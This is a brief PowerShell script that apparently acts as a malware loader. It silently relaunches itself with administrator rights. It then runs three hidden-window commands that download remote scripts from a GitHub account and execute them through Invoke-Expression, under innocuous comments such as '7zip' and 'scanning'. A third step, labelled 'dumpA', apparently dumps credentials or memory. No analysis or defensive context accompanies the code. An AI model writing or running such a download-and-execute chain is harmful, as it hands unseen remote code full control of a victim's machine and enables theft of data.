if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole("Administrators")) { Start-Process powershell -WindowStyle Hidden "-File `"$PSCommandPath`"" -Verb RunAs; exit }

#7zip
powershell -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tameval/script/main/unzip_124509')"

#scanning
powershell -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tameval/script/main/scan_124509')"

#dumpA
powershell -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tameval/script/main/cdumpa_124509')"
